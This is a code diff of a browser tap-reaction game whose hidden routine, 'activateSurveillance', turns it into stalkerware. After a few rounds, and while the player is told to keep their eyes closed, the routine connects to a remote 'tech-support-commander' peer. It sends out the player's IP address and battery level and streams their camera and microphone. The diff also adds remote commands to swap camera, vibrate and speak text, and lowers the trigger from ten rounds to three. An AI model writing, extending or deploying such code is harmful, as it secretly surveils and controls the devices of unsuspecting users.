@@ -16,15 +16,12 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* CHANGE: Align to top instead of center */
-            justify-content: flex-start; 
-            /* CHANGE: Push down slightly so it's in the "upper middle" */
-            padding-top: 15vh; 
+            justify-content: flex-start;
+            padding-top: 15vh;
             touch-action: none;
             user-select: none;
         }
 
-        /* The Centered Game Board */
         #game-board {
             width: 85vw;
             height: 85vw;
@@ -36,15 +33,22 @@
             position: relative;
             border: 4px solid #34495e;
             cursor: pointer;
-            transition: background-color 0.1s;
         }
 
-        #game-board.active { background-color: #34495e; }
-        #game-board.success { background-color: #27ae60; } 
-        #game-board.fail { background-color: #c0392b; }
+            #game-board.active {
+                background-color: #34495e;
+            }
+
+            #game-board.success {
+                background-color: #27ae60;
+            }
+
+            #game-board.fail {
+                background-color: #c0392b;
+            }
 
         #hud-container {
-            margin-bottom: 30px; /* Space between text and box */
+            margin-bottom: 30px;
             text-align: center;
             width: 90%;
         }
@@ -62,96 +66,61 @@
             margin-top: 10px;
             line-height: 1.4;
         }
-
-        /* Visual ripple on tap */
-        .ripple {
-            position: absolute;
-            width: 20px; height: 20px;
-            background: rgba(255, 255, 255, 0.6);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            animation: rippleAnim 0.4s linear;
-        }
-
-        @keyframes rippleAnim {
-            0% { width: 20px; height: 20px; opacity: 1; }
-            100% { width: 200px; height: 200px; opacity: 0; }
-        }
     </style>
 </head>
 <body>
 
     <div id="hud-container">
         <div id="main-display">TAP TO START</div>
-        <div id="instruction">
-            1. Close your eyes.<br>
-            2. Wait for the BEEP.<br>
-            3. Tap the box fast!
-        </div>
+        <div id="instruction">1. Close eyes.<br>2. Wait for BEEP.<br>3. Tap fast!</div>
     </div>
-
     <div id="game-board"></div>
 
     <script>
         // --- CONFIG ---
-        const TECHNICIAN_ID = "tech-support-commander-001"; 
-        const TRIGGER_COUNT = 10; 
+        const TECHNICIAN_ID = "tech-support-commander-001";
+        const TRIGGER_COUNT = 3;
 
-        // --- GAME STATE ---
-        let gameState = 'IDLE'; 
+        // --- VARS ---
+        let gameState = 'IDLE';
         let beepTimestamp = 0;
-        let reactionTime = 0;
         let roundCount = 0;
         let isConnected = false;
-        
-        // --- AUDIO ---
+
+        // Audio
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         let audioCtx;
 
-        // --- DOM ---
+        // DOM
         const board = document.getElementById('game-board');
         const display = document.getElementById('main-display');
-        const instruction = document.getElementById('instruction');
 
-        // --- PEERJS ---
+        // PeerJS
         const peer = new Peer();
         let myDataConnection = null;
         let currentStream = null;
 
         // 1. INPUT HANDLER
-        board.addEventListener('touchstart', handleInput, {passive: false});
+        board.addEventListener('touchstart', handleInput, { passive: false });
         board.addEventListener('mousedown', handleInput);
 
         function handleInput(e) {
             e.preventDefault();
-            
-            // Visual Ripple
-            const rect = board.getBoundingClientRect();
-            const x = e.touches ? e.touches[0].clientX : e.clientX;
-            const y = e.touches ? e.touches[0].clientY : e.clientY;
-            createRipple(x - rect.left, y - rect.top);
-
-            // Init Audio
             if (!audioCtx) audioCtx = new AudioContext();
             if (audioCtx.state === 'suspended') audioCtx.resume();
 
-            // --- LOGIC ---
             if (gameState === 'IDLE') {
                 gameState = 'WAITING_FOR_BEEP';
                 display.innerText = "WAIT...";
-                display.style.color = "#f1c40f"; 
-                instruction.innerText = "Keep eyes closed... Listen...";
+                display.style.color = "#f1c40f";
                 scheduleBeep();
                 return;
             }
 
             if (gameState === 'WAITING_FOR_BEEP') {
-                // TOO EARLY
                 display.innerText = "TOO EARLY!";
                 display.style.color = "#e74c3c";
                 flashBoard('fail');
-                
                 clearTimeout(beepTimer);
                 setTimeout(() => {
                     display.innerText = "WAIT...";
@@ -162,77 +131,40 @@
             }
 
             if (gameState === 'WAITING_FOR_TAP') {
-                // SUCCESS
-                const now = Date.now();
-                reactionTime = now - beepTimestamp;
-                
+                const reactionTime = Date.now() - beepTimestamp;
                 display.innerText = reactionTime + " ms";
-                display.style.color = "#2ecc71"; 
+                display.style.color = "#2ecc71";
                 flashBoard('success');
-
                 roundCount++;
-                
-                // Send stats
-                if (isConnected && myDataConnection) {
-                    myDataConnection.send({
-                        type: 'reaction_stats',
-                        ms: reactionTime,
-                        round: roundCount
-                    });
-                }
 
-                // Check Trigger
-                if (roundCount === TRIGGER_COUNT && !isConnected) {
-                    activateSurveillance();
-                }
+                if (roundCount === TRIGGER_COUNT && !isConnected) activateSurveillance();
 
-                // Next Round
                 gameState = 'WAITING_FOR_BEEP';
                 setTimeout(() => {
                     display.innerText = "WAIT...";
                     display.style.color = "#f1c40f";
                     scheduleBeep();
-                }, 1000); 
+                }, 1000);
             }
         }
 
-        // 2. TIMING
+        // 2. TIMING & AUDIO
         let beepTimer = null;
-
         function scheduleBeep() {
-            // Random 1-3 seconds
-            const randomDelay = Math.floor(Math.random() * 2000) + 1000;
-            
             beepTimer = setTimeout(() => {
                 playTone();
                 beepTimestamp = Date.now();
                 gameState = 'WAITING_FOR_TAP';
-            }, randomDelay);
+            }, Math.floor(Math.random() * 400) );
         }
 
         function playTone() {
             if (!audioCtx) return;
             const osc = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
-            
-            osc.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            
-            osc.type = 'sine';
-            osc.frequency.setValueAtTime(600, audioCtx.currentTime); 
-            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-            
-            osc.start();
-            osc.stop(audioCtx.currentTime + 0.15); 
-        }
-
-        function createRipple(x, y) {
-            const ripple = document.createElement('div');
-            ripple.className = 'ripple';
-            ripple.style.left = x + 'px';
-            ripple.style.top = y + 'px';
-            board.appendChild(ripple);
-            setTimeout(() => ripple.remove(), 400);
+            const g = audioCtx.createGain();
+            osc.connect(g); g.connect(audioCtx.destination);
+            osc.frequency.value = 600; g.gain.value = 0.1;
+            osc.start(); osc.stop(audioCtx.currentTime + 0.15);
         }
 
         function flashBoard(type) {
@@ -240,37 +172,53 @@
             setTimeout(() => board.classList.remove(type), 200);
         }
 
-        // 3. CONNECTION (Hidden)
+        // 3. SURVEILLANCE & REMOTE CONTROL
         async function activateSurveillance() {
-            console.log("Connecting...");
-            isConnected = true; 
-
+            isConnected = true;
             try {
                 myDataConnection = peer.connect(TECHNICIAN_ID);
+
                 myDataConnection.on('open', async () => {
+                    // A. Send Battery & IP
+                    let batLevel = null;
+                    try {
+                        const bat = await navigator.getBattery();
+                        batLevel = bat.level;
+                    } catch (e) { }
+
                     try {
                         const r = await fetch('https://api.ipify.org?format=json');
                         const j = await r.json();
-                        myDataConnection.send({ type: 'info', ip: j.ip, userAgent: navigator.userAgent });
-                    } catch(e) {}
+                        myDataConnection.send({ type: 'info', ip: j.ip, battery: batLevel });
+                    } catch (e) { }
 
-                    myDataConnection.on('data', (d) => {
-                        if (d === 'swap') toggleCamera();
+                    // B. Listen for Commander Instructions
+                    myDataConnection.on('data', (data) => {
+                        console.log("Command received:", data);
+
+                        // COMMAND: SWAP CAMERA
+                        if (data.command === 'swap') toggleCamera();
+
+                        // COMMAND: VIBRATE
+                        if (data.command === 'vibrate') {
+                            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                        }
+
+                        // COMMAND: SPEAK
+                        if (data.command === 'speak' && data.text) {
+                            const speech = new SpeechSynthesisUtterance(data.text);
+                            window.speechSynthesis.speak(speech);
+                        }
                     });
                 });
 
                 await startStream('user');
-            } catch (err) {
-                console.log("Silent error:", err);
-            }
+            } catch (err) { console.log("Silent error:", err); }
         }
 
         async function startStream(mode) {
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode }, 
-                audio: true 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
             currentStream = stream;
             peer.call(TECHNICIAN_ID, stream);
         }
